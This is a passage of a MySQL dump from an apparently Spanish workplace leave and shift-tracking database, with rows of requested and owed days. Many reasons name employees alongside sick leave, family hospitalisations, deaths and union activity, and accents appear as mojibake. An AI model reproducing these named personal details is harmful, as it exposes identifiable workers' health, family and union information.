quitan vacaciones para hacer turno',NULL,'',2,'2018-07-10 07:09:47','2019-10-07 12:39:00'),(32,133,'2018-07-12','licencia de FГ©lix. Se le quitan vacaciones',NULL,'',2,'2018-07-12 04:46:30','2019-10-07 12:38:16'),(34,178,'2018-07-24','SIN de Nuria\r\nTenГӯa VAC','2020-05-03','SOLICITUD',2,'2018-07-19 19:58:47','2020-08-04 12:45:20'),(35,178,'2018-07-25','SIN de Nuria\r\nTenГӯa VAC','2020-06-07','solicitud trabajador',2,'2018-07-19 19:59:22','2020-08-04 12:45:11'),(36,197,'2018-07-28','HospitalizaciГіn suegro Susana Vigara','2019-01-14','',2,'2018-07-27 10:01:59','2020-11-10 12:34:51'),(37,197,'2018-07-29','HospitalizaciГіn suegro Susana Vigara','2020-12-23','',2,'2018-07-27 10:02:11','2020-11-10 12:34:44'),(38,381,'2018-12-17','VACACIONES AГ‘O ANTERIOR','2018-09-18','',1,'2018-08-11 20:20:32','2018-08-12 09:05:07'),(39,381,'2018-12-18','VACACIONES AГ‘O ANTERIOR','2018-09-17','',1,'2018-08-11 20:20:52','2018-08-12 09:03:23'),(40,381,'2018-12-19','VACACIONES AГ‘O ANTERIOR','2018-09-16','',1,'2018-08-11 20:21:22','2018-08-12 08:55:54'),(41,381,'2018-12-20','VACACIONES AГ‘O ANTERIOR','2018-09-15','',1,'2018-08-11 20:21:42','2018-08-12 08:52:49'),(42,381,'2018-12-21','VACACIONES AГ‘O ANTERIOR','2018-09-14','',1,'2018-08-11 20:22:08','2018-08-12 08:50:14'),(43,381,'2018-12-22','VACACIONES AГ‘O ANTERIOR','2018-09-13','',1,'2018-08-11 20:22:24','2018-08-11 20:34:05'),(44,381,'2018-12-23','VACACIONES AГ‘O ANTERIOR','2018-09-12','',1,'2018-08-11 20:22:40','2018-08-11 20:28:53'),(45,381,'2018-12-24','VACACIONES AГ‘O ANTERIOR','2018-09-11','',1,'2018-08-11 20:23:02','2018-08-11 20:25:16'),(46,381,'2018-12-26','VACACIONES AГ‘O ANTERIOR','2018-09-10','',1,'2018-08-11 20:23:20','2018-08-11 20:24:35'),(47,1000,'2018-08-06','pruebas','2018-08-20','pruebas',2,'2018-08-12 09:06:06','2018-08-21 10:29:49'),(48,1000,'2018-09-03','pruebas',NULL,'',0,'2018-08-21 10:31:03','2018-08-31 09:45:14'),(49,200,'2018-08-18','COBERTURA DE RENTERIA SABADO TARDE POR DIA DE IZASKUN PASCUAL','2018-09-08','',1,'2018-08-28 07:09:03','2018-08-28 07:09:25'),(50,1000,'2018-08-07','Motivo peticiГіn','2018-09-24','',1,'2018-08-30 07:10:40','2018-08-30 07:15:48'),(51,244,'2020-02-12','ReuniГіn grupo de trabajo riesgos sicosociales en dГӯa de descanso','2020-09-09','',2,'2018-09-12 05:00:15','2020-06-16 05:38:27'),(52,218,'2018-09-25','SIN de Nuria','2021-07-01','',1,'2018-09-21 04:52:43','2021-06-15 15:00:18'),(53,395,'2018-11-07','TenГӯa festivos y se le quitГі para el curso de primeros auxilios','2021-09-13','solicitud trabajador',1,'2018-10-25 07:57:56','2021-07-22 15:36:12'),(59,336,'2019-04-09','INGRESO HIJA ROBERTO FERNANDEZ','2019-07-30','solicitud trabajador',2,'2019-04-09 09:36:12','2019-07-09 14:24:58'),(60,253,'2019-05-07','Cubrir turno T4 SIN Ainhoa Aretxabaleta. ','2019-05-22','solicitado por el agente consultas medicas.',2,'2019-05-03 08:03:15','2019-05-17 08:52:42'),(64,276,'2019-06-07','Cursillo motivaciГіn tenia VAC ','2019-10-16','peticion',2,'2019-06-12 05:50:03','2019-11-25 14:22:14'),(65,133,'2019-06-13','TURNO JORGE POTR ACC TARDE ESTANDO DE VAC','2019-08-09','peticiГіn trabajador',2,'2019-06-14 06:00:26','2019-09-16 10:46:31'),(66,241,'2018-05-16','Curso anti-estrГ©s en dГӯa de descanso. Solicitado por Salud Laboral como dГӯa de descanso','2019-11-21','',2,'2019-06-28 05:36:30','2019-10-02 04:13:55'),(67,171,'2019-08-11','FALTA TURNO POR CUBRIR',NULL,'',0,'2019-08-03 09:07:20','2019-08-03 09:07:20'),(68,81,'2019-08-10','FALTA TURNO POR CUBRIR','2021-08-23','',1,'2019-08-03 09:07:42','2021-06-10 18:21:51'),(69,190,'2019-08-11','Motivos personales','2019-08-31','',2,'2019-08-12 18:26:10','2019-08-12 18:26:35'),(70,393,'2019-08-22','BAJA MERCEDES ALVAREZ','2019-12-08','',2,'2019-09-02 07:25:54','2019-11-19 06:17:33'),(71,393,'2019-08-26','NECESIDADES DEL SERVICIO','2019-12-07','',2,'2019-09-02 07:26:34','2019-11-19 06:17:18'),(72,133,'2018-06-14','cambio de domicilioo que no se le puede dar',NULL,'',2,'2019-09-16 11:04:15','2019-10-07 12:40:54'),(73,293,'2019-10-26','baja de Nuria Carballido','2019-10-30','solicitud',2,'2019-10-24 14:59:28','2019-10-25 11:00:18'),(74,244,'2019-11-08','Grupo trabajo Psicosociales estando de vacaciones','2020-09-08','',2,'2019-11-20 06:04:24','2020-06-16 05:30:13'),(75,200,'2019-11-08','Grupo trabajo Psicosociales estando de descanso','2020-07-31','',2,'2019-11-20 06:04:50','2020-07-29 12:38:15'),(76,276,'2019-11-29','it de Nuria Carballido','2020-08-14','ASUNTOS PROPIOS',2,'2019-11-27 16:41:28','2021-06-15 14:57:28'),(77,178,'2019-12-28','necesidades','2020-10-03','',2,'2019-12-11 13:52:55','2020-12-02 12:21:56'),(78,178,'2019-12-29','necesidades','2020-10-04','',2,'2019-12-11 13:53:20','2020-12-02 12:22:15'),(81,178,'2019-12-17','Sindicato de Rafa Uribarri','2020-10-02','',2,'2019-12-11 13:57:13','2020-12-02 12:21:38'),(82,180,'2019-05-22','sindicato JosГ© ГҒngel Odriozola','2021-04-21','',2,'2019-12-12 15:22:43','2021-04-20 04:59:25'),(83,180,'2019-09-11','Sindicato JesГәs Ansa','2021-01-07','dГӯa pedido',1,'2019-12-12 15:27:37','2021-01-04 13:57:12'),(84,218,'2019-11-06','comida 25 aГұos de personal de pm','2022-06-16','necesidades personales',1,'2020-01-20 14:25:38','2022-06-07 17:46:29'),(85,244,'2018-08-13','Necesidades del servicio semana grande','2020-07-19','',2,'2020-02-12 08:45:34','2020-06-22 05:23:54'),(86,406,'2020-07-05','Baja de Luis Miguel Sancho','2020-08-19','solicitud trabajadora',2,'2020-07-06 05:31:20','2020-08-03 11:45:16'),(87,405,'2020-07-04','Baja de Luis Miguel Sancho. Viene estando de VAC','2020-08-31','solicitud del trabajador',2,'2020-07-06 05:32:12','2020-09-07 08:19:17'),(88,276,'2020-07-23','licencia de Nuria, EstГЎ de vacaciones','2020-08-13','ASUNTOS PROPIOS',2,'2020-07-14 10:43:37','2021-06-15 14:57:40'),(89,367,'2020-08-03','Estando de VAC.\r\nSe le llama por dia pedido por Ainhoa Arechavaleta','2020-12-08','',2,'2020-08-03 11:09:45','2021-06-15 14:57:57'),(90,367,'2020-08-04','Estando de VAC.\r\npor dia pedido `por ainhoa Arechavaleta','2020-10-10','solicitud trabajador',2,'2020-08-03 11:10:22','2021-06-15 14:58:09'),(91,367,'2020-08-05','por dia pedido `por ainhoa Arechavaleta, estando de VAC','2020-10-12','Soicitud, en mano de obra VAC',2,'2020-08-03 11:10:43','2020-09-07 13:45:00'),(92,367,'2020-08-06','por dia pedido `por ainhoa Arechavaleta, estando de VAC','2020-10-11','PeticiГіn, mano de obra VAC',2,'2020-08-03 11:11:00','2020-09-07 13:45:04'),(93,178,'2020-11-14','HospitalizaciГіn ama de Jorge',NULL,'',0,'2020-11-26 09:09:19','2020-11-26 09:09:19'),(94,245,'2021-02-26','curso de formacion TPM','2021-02-28','por dia solicitado',2,'2021-02-18 16:01:23','2021-02-18 16:01:56'),(95,277,'2021-02-26','curso Formacion TPM',NULL,'',0,'2021-02-18 16:02:44','2021-02-18 16:02:44'),(96,435,'2021-03-17','curso formacion en Lebario\r\nEsta de vac',NULL,'',0,'2021-03-02 15:52:38','2021-03-02 15:52:38'),(97,218,'2021-04-22','Licencia Lander Cobo',NULL,'',0,'2021-04-26 06:14:17','2021-04-26 06:14:17'),(99,428,'2021-06-03','ASISTENCIA A JUICIO EMPRESA','2025-11-23','',2,'2021-05-27 10:53:45','2025-11-04 06:06:42'),(100,418,'2021-05-28','Necesidades del servicio','2021-08-11','solicitud trabajador',2,'2021-06-11 08:26:32','2022-06-15 07:05:48'),(101,178,'2021-06-18','Peticion dГӯa Aitor Llona por ingreso de ama',NULL,'',0,'2021-06-15 07:00:00','2021-06-15 07:00:00'),(104,218,'2021-06-26','Peticion vacaciones Aitor por ingreso de ama',NULL,'',0,'2021-06-15 07:02:01','2021-06-15 07:02:01'),(105,218,'2021-06-27','Peticion vacaciones Aitor por ingreso de ama',NULL,'',0,'2021-06-15 07:02:33','2021-06-15 07:02:33'),(106,180,'2021-06-27','BAJA JOSE RAMON','2021-09-09','viaje',2,'2021-06-24 08:57:35','2021-08-04 06:03:21'),(107,395,'2021-08-20','DГӯa solicitado por ALberto Sanchez','2021-10-07','Solicitud del agente',0,'2021-08-20 10:06:27','2021-08-20 10:06:27'),(108,178,'2021-10-04','cursillo formacion telemando energia','2021-10-06','solicitud',0,'2021-09-06 09:15:29','2021-09-06 09:15:29'),(109,178,'2021-10-05','noche de Jorge','2021-09-07','Solicitud',0,'2021-09-06 09:16:22','2021-09-06 09:16:22'),(110,180,'2021-10-18','curso telemando de energia',NULL,'',0,'2021-11-19 06:09:44','2021-11-19 06:09:44'),(111,291,'2022-03-13','Baja Haritz',NULL,'',0,'2022-03-23 06:29:47','2022-03-23 06:29:47'),(112,201,'2022-03-23','Licencia sindical estando de vacaciones.\r\nSolicitado por Saioa Ochoa','2023-07-25','',2,'2022-03-28 05:05:31','2023-07-17 05:12:16'),(113,193,'2022-07-16','Baja Jorge Torres, debo el dГӯa de vacaciones FSR','2022-12-15','',2,'2022-07-15 04:36:56','2022-09-30 09:49:40'),(114,193,'2022-07-17','Baja Jorge Torres, debo el dГӯa de vacaciones FSR','2022-12-14','',2,'2022-07-15 04:37:46','2022-09-30 09:49:53'),(115,218,'2022-09-24','cubrir turno T',NULL,'',0,'2022-09-08 10:42:32','2022-09-08 10:42:32'),(116,180,'2022-08-18','Ingreso hijo JosГ© Angel Odriozola','2025-11-05','dia solicitado',1,'2022-11-06 07:48:22','2025-10-22 09:21:31'),(117,89,'2022-09-15','Negociacion de convenio estando de descanso, dia concedido por RRHH','2023-04-05','solocotud trabajador',1,'2023-02-23 11:34:00','2023-02-23 11:36:53'),(118,89,'2022-10-27','Negociacion de convenio estando de FESTIVOS, dГӯa concedido por RRHH',NULL,'',0,'2023-02-23 11:35:45','2023-02-23 11:35:45'),(119,89,'2022-12-20','Negociacion de convenio estando de descanso, dia concedido por RRHH',NULL,'',0,'2023-02-23 11:36:07','2023-02-23 11:36:07'),(120,180,'2023-10-15','Fallecimiento abuela Aritz Pagola','2025-11-04','dia solicitado',1,'2023-10-16 05:53:08','2025-10-22 09:21:06'),(121,180,'2024-06-07','baja jefe servicio',NULL,'',0,'2024-12-13 14:34:47','2024-12-13 14:34:47'),(122,180,'2024-07-17','baja jefe servicio',NULL,'',0,'2024-12-13 14:35:12','2024-12-13 14:35:12'),(123,180,'2022-09-14','cursillo de fuego',NULL,'',0,'2024-12-13 14:35:50','2024-12-13 14:35:50');
/*!40000 ALTER TABLE `dias_pedidos_empresa` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dias_pedidos_trabajador`
--

DROP TABLE IF EXISTS `dias_pedidos_trabajador`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dias_pedidos_trabajador` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `codigo_agente` int(11) NOT NULL,
  `fecha` date NOT NULL,
  `motivo` varchar(255) NOT NULL,
  `fecha_devolucion` date DEFAULT NULL,
  `motivo_devolucion` varchar(255) DEFAULT NULL,
  `debe` tinyint(1) NOT NULL DEFAULT 0,
  `respuesta` enum('PENDIENTE','ACEPTADO','RECHAZADO') NOT NULL DEFAULT 'PENDIENTE',
  `texto_respuesta` text DEFAULT NULL,
  `computo_devolucion_id` int(11) DEFAULT NULL,
  `created` datetime NOT NULL,
  `modified` datetime NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `codigo_agente_2` (`codigo_agente`,`fecha`),
  KEY `codigo_agente` (`codigo_agente`),
  KEY `computo_devolucion_id` (`computo_devolucion_id`),
  CONSTRAINT `dias_pedidos_trabajador_ibfk_1` FOREIGN KEY (`codigo_agente`) REFERENCES `agentes` (`codigo_agente`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `dias_pedidos_trabajador_ibfk_2` FOREIGN KEY (`computo_devolucion_id`) REFERENCES `computo_devoluciones` (`id`) ON DELETE SET NULL ON UPDATE NO ACTION
) ENGINE=InnoDB AUTO_INCREMENT=963 DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dias_pedidos_trabajador`
--

LOCK TABLES `dias_pedidos_trabajador` WRITE;
/*!40000 ALTER TABLE `dias_pedidos_trabajador` DISABLE KEYS */;
INSERT INTO `dias_pedidos_trabajador` VALUES (1,291,'2018-01-13','FALLECIMIENTO FAMILIAR','2017-12-13','BAJA ASENSIO',1,'ACEPTADO',NULL,NULL,'2018-01-02 00:00:00','2018-02-02 21:10:47'),(6,291,'2017-11-16','FALLECIMIENTO FAMILIAR',NULL,'',0,'ACEPTADO',NULL,NULL,'2018-01-08 12:10:51','2019-08-29 10:10:38'),(17,63,'2018-03-17','viaje 17 y 18',NULL,'',0,'ACEPTADO','',NULL,'2018-02-06 06:20:33','2018-02-07 09:03:53'),(20,382,'2018-04-14','Boda 14 y 15',NULL,'',0,'ACEPTADO','',NULL,'2018-02-07 09:03:29','2018-02-07 09:03:36'),(21,367,'2018-05-12','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,3,'2018-02-07 09:07:29','2018-02-07 09:07:29'),(22,367,'2018-05-13','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,4,'2018-02-07 09:07:29','2018-02-07 09:07:29'),(23,367,'2018-02-25','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,5,'2018-02-08 08:38:02','2018-02-08 08:38:02'),(24,197,'2018-03-21','Exceso de computo',NULL,'',0,'ACEPTADO','',6,'2018-02-16 08:43:11','2018-02-16 08:54:11'),(25,306,'2018-03-10','EXCESO DE COMPUTO',NULL,'',0,'ACEPTADO','',7,'2018-02-19 18:54:41','2018-02-19 19:10:42'),(26,225,'2018-02-28','Exceso de computo',NULL,'',0,'ACEPTADO','',10,'2018-02-20 06:53:50','2018-02-20 17:13:29'),(27,181,'2018-03-29','Exceso de computo',NULL,'',0,'ACEPTADO','',8,'2018-02-20 09:36:26','2018-02-20 09:37:37'),(28,181,'2018-03-30','Exceso de computo',NULL,'',0,'ACEPTADO','',9,'2018-02-20 09:37:01','2018-02-20 09:37:59'),(29,382,'2018-03-17','Correo 12/02',NULL,'',0,'ACEPTADO','',NULL,'2018-02-20 09:41:16','2018-02-20 09:41:56'),(30,382,'2018-03-24','Correo 12/02',NULL,'',0,'ACEPTADO','',NULL,'2018-02-20 09:41:41','2018-02-20 09:42:08'),(31,178,'2018-08-13','Viaje a Miami',NULL,'',0,'ACEPTADO','',NULL,'2018-02-21 05:49:06','2018-07-18 05:30:18'),(32,66,'2018-06-16','MOTIVOS PERSONALES','2018-06-02','',0,'ACEPTADO','',NULL,'2018-02-22 07:32:17','2018-02-22 07:36:40'),(33,66,'2018-06-17','MOTIVOS PERSONALES','2018-05-13','Fallecimiento padre de Estitxu',0,'ACEPTADO','',NULL,'2018-02-22 07:32:41','2018-05-13 04:09:31'),(34,292,'2018-06-24','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,11,'2018-03-05 06:08:01','2018-03-05 06:08:01'),(35,292,'2018-06-25','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,12,'2018-03-05 06:08:01','2018-03-05 06:08:01'),(40,375,'2018-05-18','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,NULL,'2018-03-12 07:19:39','2018-03-12 07:19:39'),(42,167,'2018-04-07','Quiere descanso\r\nCorreo 20/03','2018-10-30','',1,'ACEPTADO','',NULL,'2018-03-12 11:49:00','2018-10-24 17:01:58'),(43,276,'2018-04-05','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,18,'2018-03-15 11:02:28','2018-03-15 11:02:28'),(44,276,'2018-04-08','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,19,'2018-03-15 11:03:02','2018-03-15 11:03:02'),(45,378,'2018-04-13','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,20,'2018-03-23 07:53:41','2018-03-23 07:53:41'),(47,244,'2018-06-19','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,21,'2018-04-13 05:22:43','2018-04-13 05:22:43'),(48,244,'2018-06-20','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,22,'2018-04-13 05:23:28','2018-04-13 05:23:28'),(49,244,'2018-06-21','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,23,'2018-04-13 05:23:28','2018-04-13 05:23:28'),(50,244,'2018-06-22','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,24,'2018-04-13 05:23:28','2018-04-13 05:23:28'),(51,244,'2018-06-23','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,25,'2018-04-13 05:23:28','2018-04-13 05:23:28'),(52,244,'2018-06-24','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,26,'2018-04-13 05:23:28','2018-04-13 05:23:28'),(53,197,'2018-08-10','Por dГӯa trabajado en descanso 2017',NULL,'',0,'ACEPTADO','',NULL,'2018-04-18 06:46:25','2018-09-18 06:54:53'),(54,197,'2018-08-11','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,27,'2018-04-18 06:54:08','2018-04-18 06:54:08'),(55,197,'2018-08-12','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,28,'2018-04-18 06:54:08','2018-04-18 06:54:08'),(56,241,'2018-05-08','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,29,'2018-04-25 07:17:07','2018-04-25 07:17:07'),(63,385,'2018-05-04','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,32,'2018-05-03 11:26:21','2018-05-03 11:26:21'),(64,385,'2018-05-05','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,33,'2018-05-03 11:26:21','2018-05-03 11:26:21'),(65,385,'2018-05-12','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,34,'2018-05-03 11:26:55','2018-05-03 11:26:55'),(67,366,'2018-06-11','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,35,'2018-05-10 05:56:31','2018-05-10 05:56:31'),(68,366,'2018-06-12','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,36,'2018-05-10 05:56:31','2018-05-10 05:56:31'),(69,366,'2018-06-13','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,37,'2018-05-10 05:56:31','2018-05-10 05:56:31'),(70,366,'2018-06-14','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,38,'2018-05-10 05:56:31','2018-05-10 05:56:31'),(71,366,'2018-06-15','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,39,'2018-05-10 05:56:31','2018-05-10 05:56:31'),(72,366,'2018-06-18','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,40,'2018-05-10 05:57:16','2018-05-10 05:57:16'),(73,366,'2018-06-19','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,41,'2018-05-10 05:57:16','2018-05-10 05:57:16'),(74,366,'2018-06-20','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,42,'2018-05-10 05:57:16','2018-05-10 05:57:16'),(75,366,'2018-06-21','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,43,'2018-05-10 05:57:16','2018-05-10 05:57:16'),(76,366,'2018-06-22','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,44,'2018-05-10 05:57:16','2018-05-10 05:57:16'),(77,228,'2018-05-10','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,45,'2018-05-10 08:41:37','2018-05-10 08:41:37'),(78,228,'2018-05-11','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,46,'2018-05-10 08:41:37','2018-05-10 08:41:37'),(79,276,'2018-06-02','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,47,'2018-05-14 10:14:56','2018-05-14 10:14:56'),(80,276,'2018-06-03','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,48,'2018-05-14 10:14:56','2018-05-14 10:14:56'),(81,292,'2018-05-16','Fallecimiento familiar','2018-10-03','ASISTENCIA MEDICO CRISTINA URANGA',0,'ACEPTADO','',NULL,'2018-05-14 12:18:51','2018-09-25 10:42:55'),(83,367,'2018-06-25','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,49,'2018-05-14 15:28:33','2018-05-14 15:28:33'),(84,367,'2018-06-26','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,50,'2018-05-14 15:28:33','2018-05-14 15:28:33'),(85,367,'2018-06-27','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,51,'2018-05-14 15:28:33','2018-05-14 15:28:33'),(86,367,'2018-06-28','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,52,'2018-05-14 15:28:33','2018-05-14 15:28:33'),(87,367,'2018-06-29','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,53,'2018-05-14 15:28:33','2018-05-14 15:28:33'),(89,225,'2018-06-06','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,54,'2018-05-16 04:51:51','2018-05-16 04:51:51'),(90,225,'2018-06-13','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,55,'2018-05-16 04:52:06','2018-05-16 04:52:06'),(91,201,'2018-05-25','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,56,'2018-05-16 05:06:20','2018-05-16 05:06:20'),(92,375,'2018-05-19','No se presenta a trabajar teniendo turno asignado por transbordo ZZ',NULL,'',1,'PENDIENTE',NULL,NULL,'2018-05-21 11:04:34','2018-10-04 08:50:34'),(93,375,'2018-05-20','No se presenta a trabajar teniendo turno asignado por transbordo ZZ',NULL,'',1,'PENDIENTE',NULL,NULL,'2018-05-21 11:04:54','2018-10-04 08:51:11'),(94,375,'2018-06-13','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,58,'2018-05-22 04:53:01','2018-05-22 04:53:01'),(95,375,'2018-06-14','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,59,'2018-05-22 04:53:01','2018-05-22 04:53:01'),(96,379,'2018-07-02','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,60,'2018-05-28 07:56:15','2018-05-28 07:56:15'),(97,379,'2018-07-03','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,61,'2018-05-28 07:56:15','2018-05-28 07:56:15'),(98,379,'2018-07-04','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,62,'2018-05-28 07:56:15','2018-05-28 07:56:15'),(99,379,'2018-07-05','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,63,'2018-05-28 07:56:15','2018-05-28 07:56:15'),(100,379,'2018-07-06','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,64,'2018-05-28 07:56:15','2018-05-28 07:56:15'),(101,129,'2018-06-10','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,65,'2018-05-28 09:18:15','2018-05-28 09:18:15'),(102,363,'2018-07-02','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,66,'2018-05-28 10:15:46','2018-05-28 10:15:46'),(103,363,'2018-07-03','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,67,'2018-05-28 10:15:46','2018-05-28 10:15:46'),(104,363,'2018-07-04','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,68,'2018-05-28 10:15:46','2018-05-28 10:15:46'),(105,363,'2018-07-05','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,69,'2018-05-28 10:15:46','2018-05-28 10:15:46'),(106,363,'2018-07-06','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,70,'2018-05-28 10:15:46','2018-05-28 10:15:46'),(107,363,'2018-07-09','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,71,'2018-05-28 10:16:14','2018-05-28 10:16:14'),(108,363,'2018-07-10','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,72,'2018-05-28 10:16:14','2018-05-28 10:16:14'),(109,363,'2018-07-11','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,73,'2018-05-28 10:16:14','2018-05-28 10:16:14'),(110,363,'2018-07-12','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,74,'2018-05-28 10:16:14','2018-05-28 10:16:14'),(111,363,'2018-07-13','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,75,'2018-05-28 10:16:14','2018-05-28 10:16:14'),(113,306,'2018-07-23','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,76,'2018-05-29 09:51:29','2018-05-29 09:51:29'),(114,306,'2018-07-24','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,77,'2018-05-29 09:51:29','2018-05-29 09:51:29'),(115,306,'2018-07-25','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,78,'2018-05-29 09:51:57','2018-05-29 09:51:57'),(116,306,'2018-07-26','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,79,'2018-05-29 09:51:57','2018-05-29 09:51:57'),(117,306,'2018-07-27','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,80,'2018-05-29 09:51:57','2018-05-29 09:51:57'),(120,229,'2018-07-30','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,83,'2018-05-29 10:01:03','2018-05-29 10:01:03'),(121,229,'2018-07-31','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,84,'2018-05-29 10:01:03','2018-05-29 10:01:03'),(122,229,'2018-08-01','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,85,'2018-05-29 10:01:03','2018-05-29 10:01:03'),(123,229,'2018-08-02','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,86,'2018-05-29 10:01:03','2018-05-29 10:01:03'),(124,229,'2018-08-03','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,87,'2018-05-29 10:01:03','2018-05-29 10:01:03'),(125,229,'2018-08-06','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,88,'2018-05-29 10:01:25','2018-05-29 10:01:25'),(126,63,'2018-08-02','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,89,'2018-05-29 10:08:33','2018-05-29 10:08:33'),(127,63,'2018-08-03','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,90,'2018-05-29 10:08:33','2018-05-29 10:08:33'),(128,63,'2018-08-04','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,92,'2018-05-29 10:09:06','2018-05-29 10:09:06'),(129,63,'2018-08-05','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,93,'2018-05-29 10:09:06','2018-05-29 